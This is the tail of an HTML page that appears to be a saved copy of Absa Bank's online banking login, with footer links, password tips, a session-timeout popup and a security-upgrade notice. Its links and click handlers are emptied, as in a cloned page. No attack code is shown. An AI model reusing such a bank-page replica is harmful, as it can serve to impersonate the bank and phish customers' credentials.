      <div style="position:relative; top:0px; left:0px; width:971px; text-align:center;">
        <p tabindex="21">&#169; Copyright. Absa Bank Limited. Registration Number: 1986/004794/06 Authorized financial services and registered credit provider NCRCP7

</p>
        <div class="ap-footer-links">
                        <ul><li><a href="" id="am" target="_new">Security centre</a></li><li><a href="" id="am" target="_new">Terms of use</a></li><li><a href="" id="am" target="_new">Privacy policy</a></li><li><a href="" id="am" target="_new">Software requirements</a></li><li><a href="" id="am" target="_new">Banking regulations</a></li></ul>
                    </div>
        <div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;"></div>
      </div>
    </div>
  </div>

  <!-- password tips -->
  <div class="modalPasswordTips" style="display: none; width: 600px; height: 443px; z-index: 200;">
    <div class="ap-popup">
      <div class="ap-popup-header"><b>Password tips</b>
        <div class="clear-both"></div>
      </div>
      <div class="ap-popup-body ap-info-box">
        <ul class="ap-info-box-ul">
          <li>Never save your password/PIN on your desktop - as it may allow others to access your personal information, without your permission.</li>
          <li>Do not make your passwords too personal - rather create passwords that have letters and numbers that cannot be attributed to you.</li>
          <li>Never provide your Online ID or password/PIN to anyone, never write them down or share them, not even with a bank official.</li>
          <li>Never provide your Online ID or password/PIN to anyone.</li>
          <li>Only provide your online password or ID when your browser shows a Secure Socket Layer(SSL) connection directly to the bank.</li>
          <li>Do not leave your computer unattended after you have entered your Absa Online password.</li>
          <li>Always log or sign off at the end of a session.</li>
          <li>For your security</li>
          <li>Do not open e-mails from unknown sources.</li>
          <li>Beware of emails that ask for passwords, PINS, credit and debit card information.</li>
          <li>Avoid doing Internet Banking/ Absa Online in public areas such internet cafes as you never know what software is loaded that may compromise your transactions.</li>
          <li>Make sure no one has unauthorised access to your PC.</li>
          <li>Be especially aware that there are no security cameras trained on your PC and keyboard.</li>
          <li>Ensure you have the latest anti virus software applications loaded on your PC and mobile devices.</li>
          <li>Make sure the software on your PC is correctly licensed.</li>
          <li>Update your operating system and browser with latest patches.</li>
          <li>Install personal firewall on your PC if you use a dial-up modem.</li>
          <li>Only provide your credit card details to reputable companies.</li>
          <li>To ensure that you are using a secure shopping site, look for the lock and key and security certificates online.</li>
        </ul>
      </div>
      <div class="ap-popup-footer" style="text-align:right;">
        <button onclick="" type="submit" tabindex="0" class="ui-button ap-button-extra">
          <div class="ui-button-left">
            <div class="ui-button-right">
              <div role="button" tabindex="22" class="ui-button-center">Ok</div>
            </div>
          </div>
        </button>
      </div>
    </div>
  </div>

  <!-- LOGOUT POPUP -->
  <div class="ui-modal modalLogoffWarning" id="modalLogoffWarning" style="display:none">
    <div class="ui-modalHeader">
      <div class="ui-modalHeader-title">Logoff</div>
      <div class="ui-modalHeader-icons"></div>
    </div>
    <div class="ui-modalBody">
      <div style="padding:10px;">
        <div>Your Absa Online session is about to expire in <span class="ap-popup-body-timer" id="timerSeconds"></span> seconds</div>
        <div>Do you want to continue?</div>
      </div>
    </div>
    <div class="ui-modalFooter">
      <button type="button" class="ui-button ap-button-back" style="position:static; margin-left:0px;" onclick="absa.login.doLogout()">
        <div class="ui-button-left">
          <div class="ui-button-right">
            <div class="ui-button-center">Logoff</div>
          </div>
        </div>
      </button>
      <button type="button" class="ui-button ap-button-next" onclick="">
        <div class="ui-button-left">
          <div class="ui-button-right">
            <div class="ui-button-center">Continue</div>
          </div>
        </div>
      </button>
    </div>
  </div>

  <!-- Generic Modal -->
  <div class="ap-genericModalC-modal" style="display:none">
    <div class="ui-modal" style="width:600px">
      <form class="ui-form ap-genericModalC-form ap-genericModal-form">
        <div class="ui-modalHeader">
          <div class="ui-modalHeader-title">Online security upgrade</div>
        </div>
        <div class="ui-modalBody " style="padding:10px" tabindex="0">
          <div style="padding:10px; width:100%">
            <label class="ui-label ap-common-fontSize18px ap-common-fontBold" style="color:#680438;"><b>Online security upgrade</b></label>
            <div xmlns:ui="http://www.absa.co.za/2009/ui" class="ap-common-borderTop ap-common-marginBottom ap-common-marginTop"></div>
            <p>We have enhanced our online and mobile banking security for your protection:</p>
            <br>
            <p></p>
            <ul class="ap-info-box-ul">
              <li>If you currently verify and authorise your transactions via SMS, there is a high security risk.</li>
              <li>Please make sure that you authorise your transactions on the Banking App instead, as this enhances your online security.</li>
              <li>To update your online banking security, download the Banking App for free and follow the prompts.</li>
            </ul>
            <p></p>
            <br>&nbsp;
            <br>
            <p>Remember that Absa will <b>never ask for the full password</b>. Only use your credentials when you access Absa Online. Always access Absa Online using the Absa website address. Never click on hyperlinks or attachments to access Absa Online. If your logon process seems unfamiliar, close the browser immediately as this could be a fraudulent website. Never approve transactions if you're not transacting yourself. Absa will never call you to approve transactions. Read your verification messages in full.To report fraud or suspicious activity, call us from our Banking App or 0860557557. </p>
            <br>
          </div>
          <!-- READ_CONFIRM CHECKBOX -->

        </div>
        <div class="ui-modalFooter" style="text-align:right;">

          <button class="ui-button ap-button-next" type="button" tabindex="-1" onclick="">
            <div class="ui-button-left">
              <div class="ui-button-right">
                <div role="button" tabindex="0" class="ui-button-center">
                  Continue
                </div>
              </div>
            </div>
            <!-- PS: the SDFC_Config entry must NOT have double Quotes anywhere in it -->
            <input type="hidden" class="ap-jsFunctionTxt" value="function(){onForm2Submit_PostGenModalCheck();}">
          </button>

        </div>
      </form>
    </div>
  </div>

  <!-- hidden stuff -->
  <form>
    <input type="hidden" name="focusfield" id="focusfield" value="">
    <input type="hidden" name="lang" id="lang" value="en">
    <input type="hidden" name="dspURL" id="dspURL" value="https://e.absa.co.za/dsp/">
    <input type="hidden" name="dsp" id="dsp" value="false">
    <input type="hidden" name="dspid" id="dspid" value="0">
    <input type="hidden" name="dspReferer" id="dspReferer" value="null">
    <input type="hidden" name="dspWindowSelf" id="dspWindowSelf" value="null">
    <input type="hidden" name="landingpage" id="landingpage" value="">
    <input type="hidden" name="goto" id="goto" value="">
  </form>

  <div></div>

  <!-- Please wait controller -->
  <div></div>
  <script type="text/javascript">
    absa.showPleaseWait("<p class=\"vi-screenreader-line\">Please wait</p>");
    absa.login.init();
  </script>

  <div class="btl-resize-cursorElement"></div>
  <div class="btl-resize-lineElement"></div>
  <div class="btl-resize-outlineElement"></div>
  <div class="ap-helpText-baloon" style="opacity: 1; left: 570px; top: 223px; display: none;">
    <div class="ap-helpText-frame">
      <div class="ap-helpText-close-button"></div>
      <div>Field is required.</div>
    </div>
    <div class="ap-helpText-pin"></div>
  </div>

</body>

</html>